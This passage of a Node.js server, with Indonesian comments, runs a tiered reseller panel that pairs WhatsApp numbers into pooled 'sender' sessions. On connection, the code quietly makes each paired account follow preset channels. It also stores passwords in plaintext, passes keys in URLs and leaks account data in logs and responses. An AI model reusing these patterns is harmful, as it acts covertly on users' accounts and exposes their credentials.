            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join('library', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = FolderinActive(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[👑] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  console.log(`[👑] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[⏭️] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[👑] Semua VIP session selesai diproses.`);
};

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("library", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
       printQRInTerminal: false,
       syncFullHistory: true,
       markOnlineOnConnect: true,
       connectTimeoutMs: 60000,
       defaultQueryTimeoutMs: 0,
       keepAliveIntervalMs: 10000,
       generateHighQualityLinkPreview: true,
       version,
       browser: ["Ubuntu", "Chrome", "20.0.04"],
       logger: pino({ level: "silent" }),
       auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
        state.keys,
        pino().child({ level: "silent", stream: "store" })
      ),
    },
  });

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "XTROVIEC")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

const devicePermFile = './device_perms.json';
function loadDevicePerms() {
  try {
    if (require('fs').existsSync(devicePermFile)) {
      return JSON.parse(require('fs').readFileSync(devicePermFile, 'utf8'));
    }
  } catch(e) {}
  return {};
}
function saveDevicePerms(data) {
  require('fs').writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
}

// GET /devicePerms - ambil permission untuk username ini
app.get("/devicePerms", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const perms = loadDevicePerms();
  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
  
  // Owner selalu approved
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (requester?.role === 'owner' || keyInfo.username?.toLowerCase() === username?.toLowerCase()) {
    // Owner cek dirinya sendiri
    const isOwner = requester?.role === 'owner';
    if (isOwner && keyInfo.username === username) {
      return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
    }
  }
  
  return res.json({ valid: true, ...userPerm });
});

// POST /setDevicePerm - owner atur permission user lain
app.post("/setDevicePerm", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });
  
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, error: "Only owner can manage permissions" });
  }
  
  const { username, approved, allDevices, devices } = req.body;
  if (!username) return res.status(400).json({ valid: false, error: "Username required" });
  
  const perms = loadDevicePerms();
  perms[username.toLowerCase()] = {
    approved: approved === true || approved === 'true',
    allDevices: allDevices === true || allDevices === 'true',
    devices: Array.isArray(devices) ? devices : []
  };
  saveDevicePerms(perms);
  
  return res.json({ valid: true, message: "Permission updated" });
});

// GET /listDevicePerms - owner lihat semua permission
app.get("/listDevicePerms", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') return res.status(403).json({ valid: false });
  const perms = loadDevicePerms();
  return res.json({ valid: true, perms });
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "admin", "moderator", "staf", "patner", "vip"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  const roleLimits = {
    owner: 50,
    moderator: 45,
    patner: 40,
    staf: 3,
    admin: 35,
    vip: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    pairId: genPairId(),
  };

  db.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('./library/user_log/logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  if (targetUser.role === 'owner' && deleter.role !== 'owner') {
    console.log(`[❌ DELETE] ${deleter.role} tidak boleh menghapus role owner.`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only owner can delete another owner account." 
    });
  }

  const roleLevel = {
    staf: 7,
    moderator: 6,
    owner: 5,
    patner: 4,
    admin: 3,
    reseller: 2,
    vip: 1,
    member: 0
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  if (deleterLevel < targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('./library/user_log/logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || !["staf", "owner", "moderator", "patner", "admin", "vip"].includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  const hierarchy = {
    staf: ['moderator', 'patner', 'admin', 'reseller', 'vip', 'member', 'owner'],
    moderator: ['patner', 'admin', 'reseller', 'vip', 'member', 'owner'],
    owner: ['admin', 'patner', 'reseller', 'vip', 'member'],
    patner: ['admin', 'reseller', 'vip', 'member'],
    admin: ['reseller', 'vip', 'member']
  };

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  if (!creator || !hierarchy[creatorRole]) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const roleLimits = {
    staf: 55,
    moderator: 50,
    owner: 45,
    patner: 40,
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
    pairId: genPairId(),
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('./library/user_log/logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor || !["reseller", "admin", "patner", "owner", "moderator", "staf"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  const roleLevel = {
   staf: 7, moderator: 6, owner: 5, patner: 4, admin: 3, reseller: 2, vip: 1, member: 0
  };
  
  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('./library/user_log/logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("./library/user_log/logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function prepareAuthFolders() {
  const userId = "library";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'library' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}
function setupVipFolder() {
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}/*

async function connectSession(folderPath, sessionName, retries = 5) {
  if (activeConnections[sessionName]) return activeConnections[sessionName];

  const sessionsFold = path.join(folderPath, sessionName);

  return new Promise(async (resolve) => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
       printQRInTerminal: false,
       syncFullHistory: true,
       markOnlineOnConnect: true,
       connectTimeoutMs: 60000,
       defaultQueryTimeoutMs: 0,
       keepAliveIntervalMs: 10000,
       generateHighQualityLinkPreview: true,
       version,
       browser: ["Ubuntu", "Chrome", "20.0.04"],
       logger: pino({ level: "silent" }),
       auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
        state.keys,
        pino().child({ level: "silent", stream: "store" })
      ),
    },
  });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) qrCodes[sessionName] = qr;

        if (connection === "open") {
          delete qrCodes[sessionName];
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          console.log(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") biz[sessionName] = sock;
          else if (type === "Messenger") mess[sessionName] = sock;

          resolve(sock);
        } else if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

          if (isLoggedOut) {
            console.log(`[${sessionName}] Logged out.`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve(null);
          } else if (retries > 0) {
            setTimeout(() => connectSession(folderPath, sessionName, retries - 1).then(resolve), 5000);
          } else {
            console.log(`${sessionName} Connection failed after retries.`);
            resolve(null);
          }
        }
      });
    } catch (err) {
      console.log(`[${sessionName}] Error connecting: ${err.message}`);
      resolve(null);
    }
  });
}*/

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
       printQRInTerminal: false,
       syncFullHistory: true,
       markOnlineOnConnect: true,
       connectTimeoutMs: 60000,
       defaultQueryTimeoutMs: 0,
       keepAliveIntervalMs: 10000,
       generateHighQualityLinkPreview: true,
       version,
       browser: ["Ubuntu", "Chrome", "20.0.04"],
       logger: pino({ level: "silent" }),
       auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
        state.keys,
        pino().child({ level: "silent", stream: "store" })
      ),
    },
  });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('library', owner, number);

  if (!fs.existsSync('library')) fs.mkdirSync('library');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
       printQRInTerminal: false,
       syncFullHistory: true,
       markOnlineOnConnect: true,
       connectTimeoutMs: 60000,
       defaultQueryTimeoutMs: 0,
       keepAliveIntervalMs: 10000,
       generateHighQualityLinkPreview: true,
       version,
       browser: ["Ubuntu", "Chrome", "20.0.04"],
       logger: pino({ level: "silent" }),
       auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
        state.keys,
        pino().child({ level: "silent", stream: "store" })
      ),
    },
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
     for (const channelId of channelIds) {
      try {
       await sock.newsletterFollow(channelId);
      } catch (err) {
         if (err.message.includes("GraphQL server error")) {
         console.log(`[WARN] Gagal follow channel ${channelId}: ${err.message}`);
        }
      }
    }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('library', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const vipDir = 'library/vip';
  const baseDir = 'library';
    /*if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
    for (const file of vipFiles) {
  const sessionName = path.basename(file, '.json');
  const jsonFile = path.join(vipDir, file);
  const sessionFolder = path.join(vipDir, sessionName);

  if (activeConnections[sessionName]) {
    console.log(`[SKIP] VIP ${sessionName} already active.`);
    continue;
  }

  if (!fs.existsSync(sessionFolder)) {
    fs.mkdirSync(sessionFolder, { recursive: true });
    fs.copyFileSync(jsonFile, path.join(sessionFolder, 'creds.json'));
    console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
  }

  try {
    console.log(`[START] Connecting VIP: ${sessionName}`);
    await connectSession(sessionFolder, sessionName, 100, () => {
      if (fs.existsSync(jsonFile)) {
        fs.rmSync(jsonFile, { force: true });
        console.log(`[🗑️] VIP json dihapus: ${file}`);
      }
    });
  } catch (err) {
    console.error(`[ERROR] VIP ${sessionName}:`, err.message);
  }
}*/
/*

  if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);

  for (const file of vipFiles) {
    const sessionName = path.basename(file, '.json');

    if (activeConnections[sessionName]) {
      console.log(`[SKIP] VIP ${sessionName} already active.`);
      continue;
    }

    const sessionFolder = path.join(vipDir, sessionName);
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      fs.copyFileSync(
        path.join(vipDir, file),
        path.join(sessionFolder, 'creds.json')
      );
      console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
    }

    try {
      console.log(`[START] Connecting VIP: ${sessionName}`);
      await connectSession(vipDir, sessionName);
    } catch (err) {
      console.error(`[ERROR] VIP ${sessionName}:`, err.message);
    }
  }
}
await sleep(20000);*/
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); 

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside library`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
            
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
    
}
function prepareVipSessionFolders() {
  const vipFolder = 'library/vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}
function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}
   function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

function getSWhatsappAktif(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
function checkActiveSessionInFolder(FolderNted) {
  const folderPath = path.join('library', FolderNted);

  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

function PremGroup(chatId) {
  const data = loadAdmins();
  return data.groups.includes(Number(chatId));
}

function isDeveloper(userId) {
  return OWNER_ID.includes(Number(userId));
}

function isOwner(userId) {
  const data = loadAdmins();
  return data.owners.includes(Number(userId));
}
function isModerator(userId) {
  const data = loadAdmins();
  return data.moderator.includes(Number(userId));
}
function isVipStaf(userId) {
  const data = loadAdmins();
  return data.staf.includes(Number(userId));
}
function isPatner(userId) {
  const data = loadAdmins();
  return data.patners.includes(Number(userId));
}
function isAdmin(userId) {
  const data = loadAdmins();
  return data.admins.includes(Number(userId));
}

function isReseller(userId) {
  const data = loadAdmins();
  return data.resellers.includes(Number(userId));
}
function getUserStatus(userId) {
  if (isDeveloper(userId)) return "Pemilik";
  if (isVipStaf(userId)) return "Staf";
  if (isModerator(userId)) return "Moderator";
  if (isOwner(userId)) return "Owner";
  if (isPatner(userId)) return "Patner";
  if (isAdmin(userId)) return "Admin";
  if (isReseller(userId)) return "Reseller";
  return "No Access";
}
function hasAccess(userId, chatId) {
  return isDeveloper(userId) || isVipStaf(userId) || isOwner(userId) || isAdmin(userId) || isReseller(userId) || PremGroup(chatId);
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function checkDeletePermission(deleterId, targetUser) {
  if (!hasAccess(deleterId)) return false;
  const deleterRole = getUserStatus(deleterId);
